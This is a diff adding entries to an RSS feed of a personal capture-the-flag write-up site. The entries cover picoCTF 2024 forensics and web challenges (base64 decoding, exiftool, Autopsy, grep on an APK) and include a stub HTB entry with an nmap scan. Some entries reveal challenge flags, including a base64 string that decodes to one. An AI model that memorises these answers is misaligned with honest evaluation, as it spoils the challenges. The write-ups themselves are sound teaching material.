+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/webdecode/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;webdecode&#34;&gt;WebDecode&lt;/h1&gt;
+&lt;h3 id=&#34;do-you-know-how-to-use-the-web-inspector-start-searching-here-to-find-the-flag&#34;&gt;Do you know how to use the web inspector? Start searching here to find the flag&lt;/h3&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;inspect the about page and there is a source code right above that header is a section with this attribute notify_true=&amp;ldquo;cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9&amp;rdquo;.&lt;/li&gt;
+&lt;li&gt;from64 decord this and find the flag .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;USE : &lt;a href=&#34;https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,&#39;&#39;)&#34;&gt;https://gchq.github.io/CyberChef/#recipe=Magic(3,false,false,&#39;&#39;)&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Flag: picoCTF{web_succ3ssfully_d3c0ded_02c&amp;hellip;}&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Blame Game.md</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/blame-game/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/blame-game/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description:&lt;/h1&gt;
+&lt;p&gt;Someone&amp;rsquo;s commits seems to be preventing the program from working. Who is it?&lt;/p&gt;
+&lt;p&gt;You can download the challenge files here:
+challenge.zip&lt;/p&gt;
+&lt;p&gt;Hints:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;In collaborative projects, many users can make many changes. How can you see the
+changes within one file?&lt;/li&gt;
+&lt;li&gt;Read the chapter on Git from the picoPrimer here&lt;/li&gt;
+&lt;li&gt;You can use python3 &lt;!-- raw HTML omitted --&gt;.py to try running the code, though you won&amp;rsquo;t need
+to for this challenge.
+Challenge link: &lt;a href=&#34;https://play.picoctf.org/practice/challenge/405&#34;&gt;https://play.picoctf.org/practice/challenge/405&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;p&gt;Analyse the git repo
+We start by unpacking the zip-file&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>canYouSeeMe</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/canyouseen/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/canyouseen/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;canyouseeme&#34;&gt;CanYouSeeMe&lt;/h1&gt;
+&lt;h2 id=&#34;challenge-description&#34;&gt;Challenge Description&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;How about some hide and seek?&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;This challenge focuses on metadata analysis. The flag is hidden within the metadata of an image file.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;download-challenge&#34;&gt;Download Challenge&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget https://artifacts.picoctf.net/c_titan/6/unknown.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Extract the archive:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unzip unknown.zip
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This gives us:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ukn_reality.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;initial-analysis&#34;&gt;Initial Analysis&lt;/h2&gt;
+&lt;p&gt;A good first step in forensic challenges is checking file metadata.&lt;/p&gt;
+&lt;p&gt;Run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;exiftool ukn_reality.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;what-is-exiftool&#34;&gt;What is ExifTool?&lt;/h3&gt;
+&lt;p&gt;ExifTool is a powerful command-line utility used to read, write, and edit metadata from files such as:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>dearDiary</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/deardiary/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/deardiary/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;If you can find the flag on this disk image, we can close the case for good!
+Download the disk image here.&lt;/p&gt;
+&lt;h2 id=&#34;-step-by-step-breakdown&#34;&gt;🧠 Step-by-Step Breakdown:&lt;/h2&gt;
+&lt;h3 id=&#34;-1-download-and-extract-the-disk-image&#34;&gt;📥 1. Download and Extract the Disk Image&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget https://artifacts.picoctf.net/c_titan/63/disk.flag.img.gz
+gunzip disk.flag.img.gz
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;-2-open-with-autopsy-forensic-tool&#34;&gt;🕵️ 2. Open with Autopsy (Forensic Tool)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Autopsy is a digital forensics platform that lets you:&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Mount and explore disk images&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Recover deleted files&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;View metadata, file content, etc.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;-3-explore-the-root-directory&#34;&gt;📂 3. Explore the Root Directory&lt;/h3&gt;
+&lt;p&gt;Once loaded into Autopsy, the disk image showed 3 files in the root directory:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>endianness-v2</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/endianness-v2/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/endianness-v2/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;description&#34;&gt;Description&lt;/h1&gt;
+&lt;p&gt;Here&amp;rsquo;s a file that was recovered from a 32-bits system
+that organized the bytes a weird way. We&amp;rsquo;re not even
+sure what type of file it is.
+Download it here and see what you can get out of it&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;p&gt;By using CyberChef the file was put into the input section. Then converted to hex for the &amp;ldquo;Swap Endianness&amp;rdquo; function under a word length of 4. After this, the hex looks more like a JPG with the correct ÿØÿà␀␐JFIF␀␁ magic bytes start. After the endianness was swapped and save the file . and it automatically saved with the exension of jpg . open this image and you finally get the flag .&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Jerry</title>
+      <link>http://localhost:1313/writeups/htb/jerry/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/htb/jerry/</guid>
+      <description>&lt;hr&gt;
+&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sC -sV TARGET_IP
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
+&lt;p&gt;Describe exploit steps.&lt;/p&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h1&gt;
+&lt;p&gt;Describe privesc.&lt;/p&gt;
+&lt;h1 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;Windows IIS&lt;/li&gt;
+&lt;li&gt;File Upload Vulnerability&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    <item>
+      <title>mob Psycho</title>
+      <link>http://localhost:1313/writeups/picoctf/pico-2024/mob-psycho/</link>
+      <pubDate>Fri, 05 Jun 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/picoctf/pico-2024/mob-psycho/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
+&lt;p&gt;Can you handle APKs?
+Download the android apk here.&lt;/p&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget  https://artifacts.picoctf.net/c_titan/142/mobpsycho.apk
+unzip mobpsycho.apk
+grep -iR picoCTF *
+strings mobpsycho.apk | grep flag
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;output&#34;&gt;output&lt;/h2&gt;
+&lt;p&gt;res/color/flag.txtUT&lt;/p&gt;
+&lt;h2 id=&#34;-breakdown-grep--ir-picoctf-&#34;&gt;🔍 Breakdown: grep -iR picoCTF *&lt;/h2&gt;
+&lt;p&gt;grep — Command-line tool to search for text patterns in files.&lt;/p&gt;
+&lt;p&gt;-i — Makes the search case-insensitive (picoctf, PicoCTF, PICOCTF, etc.).&lt;/p&gt;
+&lt;p&gt;-R — Recursively searches all directories and subdirectories starting from the current one.&lt;/p&gt;
+&lt;p&gt;picoCTF — The string you&amp;rsquo;re searching for (often the format of a flag in Capture The Flag (CTF) challenges).&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Lame</title>
+      <link>http://localhost:1313/writeups/htb/lame/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/htb/lame/</guid>
+      <description>&lt;p&gt;Test HTB writeup&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Jhagan Sharma</title>
+      <link>http://localhost:1313/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/</guid>
+      <description>home</description>
+    </item>
+    <item>
+      <title>THM Blue</title>
+      <link>http://localhost:1313/writeups/tryhackme/blue/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/writeups/tryhackme/blue/</guid>
+      <description>&lt;p&gt;Test THM writeup&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
